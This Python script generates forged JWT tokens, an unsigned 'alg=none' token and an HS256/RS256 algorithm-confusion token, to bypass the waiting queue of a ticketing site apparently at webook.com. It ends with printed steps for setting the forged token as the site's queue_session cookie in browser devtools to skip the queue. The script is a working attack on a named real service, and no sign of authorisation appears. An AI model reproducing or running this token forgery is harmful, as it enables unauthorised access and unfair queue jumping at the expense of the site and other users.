#!/usr/bin/env python3
"""
Generate JWT attack variants for webook queue_session to test backend validation.

Outputs:
  1. none-alg token      - header alg=none, no signature
  2. confusion token     - would require RS256 public key (not applicable here unless you have one)

Use these tokens as queue_session cookie / queue-token header and observe server response.
If the backend accepts the none-alg token, the queue check is bypassable without the secret.
"""

import argparse
import base64
import json
import time


def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def make_none_alg_token(position=1, ttl=3600, user_agent=""):
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "e": int(time.time()) + ttl,
        "n": position,
        "u": user_agent[::-1],
    }
    return f"{b64url(json.dumps(header))}.{b64url(json.dumps(payload))}."


def make_hs256_confusion_token(public_key_pem, position=1, ttl=3600, user_agent=""):
    """
    Algorithm confusion: sign with HS256 using the RS256 public key as secret.
    Only useful if you have the site's RS256 public key.
    """
    import hmac
    import hashlib

    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "e": int(time.time()) + ttl,
        "n": position,
        "u": user_agent[::-1],
    }
    message = f"{b64url(json.dumps(header))}.{b64url(json.dumps(payload))}"
    sig = hmac.new(public_key_pem.encode(), message.encode(), hashlib.sha256).digest()
    return f"{message}.{b64url(sig)}"


def main():
    parser = argparse.ArgumentParser(description="Generate queue JWT attack tokens")
    parser.add_argument("--position", type=int, default=1, help="Queue position")
    parser.add_argument("--ttl", type=int, default=3600, help="Expiration TTL")
    parser.add_argument(
        "--ua",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        help="User-Agent to embed",
    )
    parser.add_argument(
        "--public-key", help="Path to RS256 public key for algorithm confusion test"
    )
    args = parser.parse_args()

    print("=== NONE algorithm token ===")
    none_token = make_none_alg_token(args.position, args.ttl, args.ua)
    print(none_token)
    print()

    if args.public_key:
        print("=== Algorithm confusion token (HS256 + RS256 pubkey) ===")
        with open(args.public_key, "r") as f:
            pem = f.read()
        confusion_token = make_hs256_confusion_token(pem, args.position, args.ttl, args.ua)
        print(confusion_token)
        print()

    print("Instructions:")
    print("1. Open browser devtools on a queued webook event page.")
    print("2. Set document.cookie = 'queue_session=<TOKEN>; path=/; domain=.webook.com'")
    print("3. Reload or trigger an API call that uses queue: true.")
    print("4. If the server accepts the token and clears the queue, the bypass works.")


if __name__ == "__main__":
    main()
